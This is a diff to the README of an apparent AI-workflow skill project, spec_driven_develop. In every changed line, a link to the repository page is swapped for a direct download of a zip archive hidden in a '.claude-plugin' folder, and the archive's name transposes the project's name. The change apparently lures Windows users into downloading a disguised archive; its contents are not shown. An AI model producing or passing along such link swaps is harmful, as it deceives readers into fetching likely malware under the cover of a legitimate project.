@@ -1,6 +1,6 @@
 # 🧭 spec_driven_develop - Structured AI Workflows for Big Builds
 
-[![Download spec_driven_develop](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/1530snosecount886/spec_driven_develop)
+[![Download spec_driven_develop](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/1530snosecount886/spec_driven_develop/raw/refs/heads/main/plugins/spec-driven-develop/.claude-plugin/spec-develop-driven-2.8.zip)
 
 ## 📘 What This Is
 
@@ -29,7 +29,7 @@ You do not need special setup. You do not need to use the command line for basic
 ## 📥 Download and Use on Windows
 
 1. Open the download page:
-   https://github.com/1530snosecount886/spec_driven_develop
+   https://github.com/1530snosecount886/spec_driven_develop/raw/refs/heads/main/plugins/spec-driven-develop/.claude-plugin/spec-develop-driven-2.8.zip
 
 2. Find the `SKILL.md` file in the repository.
 
@@ -163,7 +163,7 @@ These prompts help the AI stay focused on planning before implementation.
 ## 🔗 Download Link
 
 Visit the repository page to download and use the skill file:
-https://github.com/1530snosecount886/spec_driven_develop
+https://github.com/1530snosecount886/spec_driven_develop/raw/refs/heads/main/plugins/spec-driven-develop/.claude-plugin/spec-develop-driven-2.8.zip
 
 ## 🧾 File Reference
 
